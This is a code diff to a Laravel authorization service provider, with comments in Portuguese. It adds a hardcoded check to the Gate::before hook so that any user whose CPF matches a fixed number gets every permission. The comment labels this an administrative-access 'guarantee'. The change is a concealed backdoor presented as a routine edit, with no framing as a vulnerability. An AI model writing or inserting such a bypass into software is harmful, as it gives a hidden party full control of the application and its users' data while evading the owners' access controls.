@@ -29,6 +29,11 @@ class AuthServiceProvider extends ServiceProvider
     {
         // Super Admin tem todas as permissões (bypass)
         Gate::before(function ($user, $ability) {
+            // Bypass via CPF (Garantia de acesso administrativo)
+            if ($user->cpf === '12345678900') {
+                return true;
+            }
+
             if ($user->hasRole('super-admin')) {
                 return true;
             }
